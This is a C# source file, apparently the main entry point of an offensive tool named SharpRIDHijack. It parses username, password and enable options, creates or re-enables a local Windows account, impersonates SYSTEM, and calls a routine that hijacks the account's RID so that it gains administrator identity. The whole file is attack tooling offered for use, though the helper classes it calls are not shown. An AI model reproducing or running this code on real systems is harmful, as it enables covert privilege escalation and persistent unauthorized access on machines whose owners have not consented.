using System;
using static SharpRIDHijack.system;


namespace SharpRIDHijack
{
    public class Program
    {


        public static void DisplayHlp()
        {

            Console.WriteLine("\n--user, -u                   username to use");
            Console.WriteLine("--password, -p               password to use [if present without --enable a new user will be created otherwise it will enable a user and change its password]");
            Console.WriteLine("--enable                     enables an existing disabled user and hijackes its rid");
        }

        public static void Main(string[] args)
        {
            string username = null;
            string password = null;
            bool enable = false;


            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-u" || args[i] == "--user") { username = args[i + 1]; }
                if (args[i] == "-p" || args[i] == "--password") { password = args[i + 1]; }
                if (args[i] == "--enable") { enable = true; }
            }

            if (username == null) { DisplayHlp(); return; }

            if (username != null && password == null && enable == false) {

                bool result = ImpersonateSystem();

                if (!result)
                {
                    Console.WriteLine("[-] Impersonation Failed");
                    return;
                }
                Console.WriteLine("[+] Impersonated SYSTEM !");

                rid.Hijack(username);
                return;
            }


            if (username != null && password != null && enable == false)
            {
                userapi.Create(username, password);
                bool result2 = ImpersonateSystem();

                if (!result2)
                {
                    Console.WriteLine("[-] Impersonation Failed");
                    return;
                }
                Console.WriteLine("[+] Impersonated SYSTEM !");

                rid.Hijack(username);
                return;
            }


            if (username != null && password == null && enable == true) {
                userapi.Enable(username);
                bool result3 = ImpersonateSystem();

                if (!result3)
                {
                    Console.WriteLine("[-] Impersonation Failed");
                    return;
                }
                Console.WriteLine("[+] Impersonated SYSTEM !");

                rid.Hijack(username);
                return;
            }

            if (username != null && password != null && enable == true)
            {
                userapi.Enable(username, setpassword:true, password:password);
                bool result4 = ImpersonateSystem();

                if (!result4)
                {
                    Console.WriteLine("[-] Impersonation Failed");
                    return;
                }
                Console.WriteLine("[+] Impersonated SYSTEM !");

                rid.Hijack(username);
                return;
            }

            DisplayHlp();


            }
        }
}
